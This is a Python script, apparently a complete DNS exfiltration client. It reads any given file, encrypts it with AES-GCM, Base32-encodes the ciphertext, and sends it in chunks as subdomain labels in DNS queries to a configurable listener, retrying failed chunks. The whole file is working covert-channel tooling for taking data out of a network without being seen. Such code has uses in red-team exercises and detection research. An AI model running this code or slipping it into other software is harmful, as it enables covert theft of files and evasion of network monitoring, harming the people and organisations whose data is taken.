#!/usr/bin/env python3
"""
Module Name: client.py

Description: DNS exfiltration client using AES-GCM encryption + Base32 encoding.
It reads a file, encrypts its contents with AES-GCM (using EXFIL_KEY from the environment),
encodes the ciphertext in Base32 (unpadded), splits it into DNS-safe chunks, and sends each
chunk as a subdomain in a DNS A query.

Author: John Burns
Date: 2024-04-30
Version: 1.3 (AES-GCM encryption + Base32, dynamic chunk sizing)
"""
import argparse
import base64
import logging
import os
import socket
from math import ceil
from uuid import uuid4

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from dnslib import DNSRecord, DNSQuestion, QTYPE
from dotenv import load_dotenv, find_dotenv

load_dotenv(find_dotenv())

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('client')

# Load AES-GCM key from environment (hex-encoded, 32 bytes)
EXFIL_KEY = bytes.fromhex(os.environ['EXFIL_KEY'])


def encrypt_data(raw: bytes) -> bytes:
    """
    Encrypt raw bytes with AES-GCM: returns nonce||ciphertext||tag.
    """
    aesgcm = AESGCM(EXFIL_KEY)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, raw, associated_data=None)
    return nonce + ct


def encode_file_contents_base32(file_path):
    """Read file, encrypt with AES-GCM, then return Base32-encoded (unpadded) ASCII string."""
    with open(file_path, 'rb') as f:
        raw = f.read()
    encrypted_blob = encrypt_data(raw)
    b32 = base64.b32encode(encrypted_blob).decode('ascii')
    return b32.rstrip('=')


def chunk_data(data, size):
    """Yield successive size-character chunks from data."""
    for i in range(0, len(data), size):
        yield data[i:i + size]


def make_segments(encoded_data, identifier):
    """Determine optimal chunk size and split encoded data into segments."""
    # Initial estimate for segment count
    est_chunk = 48
    est_segments = ceil(len(encoded_data) / est_chunk)
    idx_digits = len(str(est_segments - 1))
    tot_digits = len(str(est_segments))
    # Overhead: identifier + two indices + hyphens
    overhead = len(identifier) + idx_digits + tot_digits + 3
    chunk_size = 63 - overhead
    segments = list(chunk_data(encoded_data, chunk_size))
    total = len(segments)
    return segments, total, chunk_size


def send_dns_query(subdomain, args):
    """Send one DNS A query for the given subdomain."""
    fqdn = f"{subdomain}.{args.domain}"
    query = DNSRecord(q=DNSQuestion(fqdn, QTYPE.A))
    data = query.pack()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.settimeout(2)
        sock.sendto(data, (args.server_ip, args.server_port))
        response, _ = sock.recvfrom(4096)
        logger.info(f"Received response: {DNSRecord.parse(response)}")
    except socket.timeout:
        logger.warning("No response received for %s", fqdn)
    except Exception as e:
        logger.error("Error sending DNS query: %s", e)
    finally:
        sock.close()


MAX_RETRIES = 3  # How many times to retry each chunk


def reliable_send(subdomain, args, retries=MAX_RETRIES):
    """Send DNS query and retry if no response."""
    query = DNSRecord(q=DNSQuestion(f"{subdomain}.{args.domain}", QTYPE.A))
    query_data = query.pack()

    for attempt in range(1, retries + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.settimeout(2)
            sock.sendto(query_data, (args.server_ip, args.server_port))
            response, _ = sock.recvfrom(1024)
            print(f"✓ Received response for chunk [{subdomain[:40]}...]:", DNSRecord.parse(response).short())
            sock.close()
            return True
        except socket.timeout:
            print(f"⚠️ Timeout (attempt {attempt}) for chunk [{subdomain[:40]}...]")
        except Exception as e:
            print(f"❌ Error sending chunk [{subdomain[:40]}...]: {e}")
        finally:
            sock.close()
    return False


def main(args):
    identifier = str(uuid4()).replace('-', '')[:8]
    encoded_data = encode_file_contents_base32(args.file_path)
    max_length = 63 - len(identifier) - 16 - 3
    segments = list(chunk_data(encoded_data, max_length))
    total_segments = len(segments)

    print(f"Sending {total_segments} chunks for identifier: {identifier}")

    failures = []

    for i, chunk in enumerate(segments):
        subdomain = f"{identifier}-{i}-{total_segments}-{chunk}"
        if len(subdomain) > 63:
            print(f"❗ Subdomain too long ({len(subdomain)} chars), skipping: {subdomain}")
            continue
        success = reliable_send(subdomain, args)
        if not success:
            failures.append(i)

    if failures:
        print(f"\n❌ Failed to send {len(failures)} chunks after {MAX_RETRIES} retries:")
        print(failures)
    else:
        print("\n✅ All chunks sent successfully.")


def get_args():
    parser = argparse.ArgumentParser(description="DNS Exfiltration Client (AES-GCM + Base32)")
    parser.add_argument("--server-ip", type=str, default="127.0.0.1", help="IP address of the DNS exfil server")
    parser.add_argument("--server-port", type=int, default=5300, help="UDP port of the DNS exfil server")
    parser.add_argument("--file-path", required=True, help="Path to the file to exfiltrate")
    parser.add_argument("--domain", type=str, default="xf.example.com", help="Domain suffix for queries")
    return parser.parse_args()


if __name__ == "__main__":
    args = get_args()
    main(args)
